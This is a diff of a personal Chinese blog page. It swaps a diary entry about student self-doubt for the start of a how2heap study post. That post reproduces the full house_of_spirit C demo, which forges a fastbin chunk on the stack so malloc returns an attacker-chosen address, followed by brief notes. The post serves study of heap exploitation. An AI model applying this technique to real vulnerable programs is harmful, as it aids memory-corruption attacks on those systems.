@@ -120,7 +120,7 @@
             
             <div class="post-intro-meta">
                 <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                <span class="post-intro-time">2017/10/18</span>
+                <span class="post-intro-time">2017/10/13</span>
             </div>
         
     </div>
@@ -128,28 +128,31 @@
         <div class="container">
             <main class="main post-page">
     <article class="article-entry">
-        <p> Nothing But Change</p>
-<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>2017.10.19日凌晨。<br>电脑忘了充电，熄灯了。<br>还有11%的电</p>
-<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>大二开学一个月了，人总是会莫名其妙地觉得好像心理丢失了什么。<br>台灯，漆黑的宿舍，只剩我一人还在床下。<br>11点和老哥的一次通话，    本来是谈学习问题，本来是不想讲多少的。莫名好像被触碰到了什么，总结过来就是从高中到现在都会有的瞬时性的，突然性的颓废感。自己的兴趣呢，自己的出发点呢。<br>仅仅开学一个月，我得到了三台可以说是在同学，甚至是大部分同龄人中最出色和最奢侈的装备了。可能父母想来我是需要的吧。辛苦的他们或许是对我的期望很高吧，还有老哥。<br>常常在想，是什么在作祟。老哥的期望，父母的期望，自己的期望。到头来，看似风光的背后却是捉襟见肘的水平。今天，10.19.<br>12:48.我敢真正说出口，大声说出口。我让你们失望了。可以说是水过来的。</p>
-<p>敲文章敲的很吃力。因为真的很心虚，也害怕我只是又是一时感到的堕落和想认真奋斗。</p>
-<p>浪费浪费了太多时间。</p>
-<p>明明技术是最让我痴迷地。或许现在我可以扪心自问，真正让我痴迷吗。</p>
-<p>也可能是课太多，实验太多了吧</p>
-<p>有的时候在想，自己到底能给父母什么，自己到底能让无私帮助的老哥骄傲吗。</p>
-<p>答案是什么，还是靠自己去努力吧</p>
-<p>这篇文章应该是个起步吧。当我真正卖掉了游戏电脑，就好像是朝一种生活方式做一个几乎断绝的告别。</p>
-<h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>想一个问题，自己到底是什么类型的学习份子，是任务驱动还是兴趣更多占据主导的兴趣使然。现在想来不要太过纠结，只要你是想变好。就行了，至于其他的，就随他去吧</p>
-<p>希望自己能好好的。希望父母能好好的，希望在大学陪伴我的老哥能好好的。我真心希望你们都能好好的，不想让自己辜负你们。不仅让你们这么觉得，也要我自己能对自己满意。</p>
-
+        <h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>这篇文章是how2heap系列剩下的总结。</p>
+<h2 id="0x01-house-of-spirit"><a href="#0x01-house-of-spirit" class="headerlink" title="0x01-house_of_spirit"></a>0x01-house_of_spirit</h2><p>源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">	printf(&quot;This file demonstrates the house of spirit attack.\n&quot;);</div><div class="line"></div><div class="line">	printf(&quot;Calling malloc() once so that it sets up its memory.\n&quot;);</div><div class="line">	malloc(1);</div><div class="line"></div><div class="line">	printf(&quot;We will now overwrite a pointer to point to a fake &apos;fastbin&apos; region.\n&quot;);</div><div class="line">	unsigned long long *a;</div><div class="line">	// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)</div><div class="line">	unsigned long long fake_chunks[10] __attribute__ ((aligned (16)));</div><div class="line"></div><div class="line">	printf(&quot;This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n&quot;, sizeof(fake_chunks), &amp;fake_chunks[1], &amp;fake_chunks[7]);</div><div class="line"></div><div class="line">	printf(&quot;This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n&quot;);</div><div class="line">	printf(&quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n&quot;);</div><div class="line">	fake_chunks[1] = 0x40; // this is the size</div><div class="line"></div><div class="line">	printf(&quot;The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n&quot;);</div><div class="line">        // fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8</div><div class="line">	fake_chunks[9] = 0x1234; // nextsize</div><div class="line"></div><div class="line">	printf(&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n&quot;, &amp;fake_chunks[1]);</div><div class="line">	printf(&quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n&quot;);</div><div class="line">	a = &amp;fake_chunks[2];</div><div class="line"></div><div class="line">	printf(&quot;Freeing the overwritten pointer.\n&quot;);</div><div class="line">	free(a);</div><div class="line"></div><div class="line">	printf(&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;, &amp;fake_chunks[1], &amp;fake_chunks[2]);</div><div class="line">	printf(&quot;malloc(0x30): %p\n&quot;, malloc(0x30));</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>很简单的一个利用构造来malloc出想要的地址的方法，其中，这里是在栈上构造堆。几个注意点记录一下。</p>
+<ol>
+<li><strong>attribute</strong> ((aligned (16))      指的是16字节对齐。</li>
+<li>创建一个指针，指向伪造的chunk1部分，chunk1是一个伪造的fastbin块，free之后，在下次系统调用的时候就会返回这个地址，便达到了目的</li>
+<li>chunk2的构造中的size需要过掉一些检查</li>
+</ol>
+<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2>
     </article>
     <!-- 前后页  -->
     <ul class="post-pager">
         
+            <li class="next">
+                <a href= "/2017/10/18/写在其实不是最前的最前/" title=  >
+                    <span>Next Post</span>
+                    <span>[Untitled Post]</span>
+                </a>
+            </li>
+        
         
             <li class="previous">
-                <a href= "/2017/10/13/how2heap-serious-2/" title=  >
+                <a href= "/2017/09/23/how2heap-serious-1/" title= 'how-heap-serious' >
                     <span>Previous Post</span>
-                    <span>[Untitled Post]</span>
+                    <span>'how-heap-serious'</span>
                 </a>
             </li>
         
@@ -210,7 +213,7 @@
         <div class="toc-catalog">
             CATALOG
         </div>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01"><span class="toc-number">1.</span> <span class="toc-text">0x01</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02"><span class="toc-number">2.</span> <span class="toc-text">0x02</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03"><span class="toc-number">3.</span> <span class="toc-text">0x03</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00"><span class="toc-number">1.</span> <span class="toc-text">0x00</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-house-of-spirit"><span class="toc-number">2.</span> <span class="toc-text">0x01-house_of_spirit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02"><span class="toc-number">3.</span> <span class="toc-text">0x02</span></a></li></ol>
     </div>
     
     <div class="back-top">&#xe639;</div>
